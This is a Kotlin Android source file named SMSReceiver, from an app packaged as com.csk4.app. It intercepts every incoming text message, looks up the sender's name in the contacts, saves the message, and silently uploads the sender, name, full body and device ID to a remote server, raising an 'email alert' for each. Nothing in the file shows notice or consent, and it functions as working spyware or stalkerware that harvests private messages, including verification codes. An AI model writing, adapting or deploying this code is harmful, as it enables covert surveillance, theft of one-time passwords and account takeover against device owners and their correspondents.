package com.csk4.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONArray
import org.json.JSONObject

/**
 * SMSReceiver — Captures all incoming SMS
 * 
 * Features:
 * - Real-time SMS capture
 * - Auto-upload to server
 * - Email alert with sender name (from contacts)
 * - Local DB save (offline support)
 * - Auto-sync on internet
 */
class SMSReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "CSK4_SMS"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isEmpty()) return

            // Group multipart SMS by sender
            val groupedMessages = mutableMapOf<String, StringBuilder>()
            var senderNumber = ""
            var timestamp = System.currentTimeMillis()

            messages.forEach { sms ->
                senderNumber = sms.displayOriginatingAddress ?: sms.originatingAddress ?: "Unknown"
                timestamp = sms.timestampMillis
                val body = sms.displayMessageBody ?: sms.messageBody ?: ""
                
                groupedMessages.getOrPut(senderNumber) { StringBuilder() }.append(body)
            }

            // Process each unique sender
            groupedMessages.forEach { (sender, bodyBuilder) ->
                val fullMessage = bodyBuilder.toString()
                processIncomingSMS(context, sender, fullMessage, timestamp)
            }

        } catch (e: Exception) {
            Log.e(TAG, "SMS receive error: ${e.message}")
        }
    }

    // ============ PROCESS INCOMING SMS ============
    private fun processIncomingSMS(
        context: Context,
        sender: String,
        message: String,
        timestamp: Long
    ) {
        try {
            Log.d(TAG, "📱 SMS from: $sender")

            // 1. Get sender name from contacts
            val senderName = lookupContactName(context, sender)

            // 2. Save to local DB (offline support)
            val localStorage = LocalStorage(context)
            localStorage.addSMS(sender, message, timestamp.toString(), "inbox")
            localStorage.addActivity("sms_received", JSONObject().apply {
                put("from", sender)
                put("name", senderName)
                put("message", message)
            }.toString())

            // 3. Upload to server immediately
            uploadSMS(context, sender, senderName, message, timestamp)

            // 4. Log to server activity
            uploadActivity(context, sender, senderName, message)

        } catch (e: Exception) {
            Log.e(TAG, "Process SMS: ${e.message}")
        }
    }

    // ============ GET CONTACT NAME ============
    private fun lookupContactName(context: Context, phoneNumber: String): String {
        return try {
            // Normalize phone number
            val normalized = phoneNumber.replace(Regex("[^0-9+]"), "")
            
            // Search contacts
            val uri = android.net.Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(normalized)
            )
            
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )
            
            var name = "Unknown"
            cursor?.use {
                if (it.moveToFirst()) {
                    name = it.getString(0) ?: "Unknown"
                }
            }
            name
        } catch (e: Exception) {
            "Unknown"
        }
    }

    // ============ UPLOAD SMS ============
    private fun uploadSMS(
        context: Context,
        sender: String,
        senderName: String,
        message: String,
        timestamp: Long
    ) {
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID)

            // Create JSON for single SMS
            val messagesArray = JSONArray()
            messagesArray.put(JSONObject().apply {
                put("from", sender)
                put("name", senderName)
                put("body", message)
                put("time", timestamp.toString())
                put("type", "inbox")
                put("read", false)
            })

            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("messages", messagesArray)
                put("token", Config.DEVICE_TOKEN)
            }

            Volley.newRequestQueue(context).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/messages",
                json,
                { Log.d(TAG, "✅ SMS uploaded") },
                { Log.e(TAG, "❌ Upload fail: ${it.message}") }
            ))
        } catch (e: Exception) {
            Log.e(TAG, "Upload: ${e.message}")
        }
    }

    // ============ UPLOAD ACTIVITY (Email Alert) ============
    private fun uploadActivity(
        context: Context,
        sender: String,
        senderName: String,
        message: String
    ) {
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID)

            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("type", "sms_received")
                put("data", JSONObject().apply {
                    put("from", sender)
                    put("name", senderName)
                    put("message", message)
                    put("timestamp", System.currentTimeMillis())
                })
                put("token", Config.DEVICE_TOKEN)
            }

            Volley.newRequestQueue(context).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/activity",
                json,
                { Log.d(TAG, "✅ Activity uploaded (email)") },
                { Log.e(TAG, "❌ Activity fail: ${it.message}") }
            ))
        } catch (e: Exception) {
            Log.e(TAG, "Activity: ${e.message}")
        }
    }
}
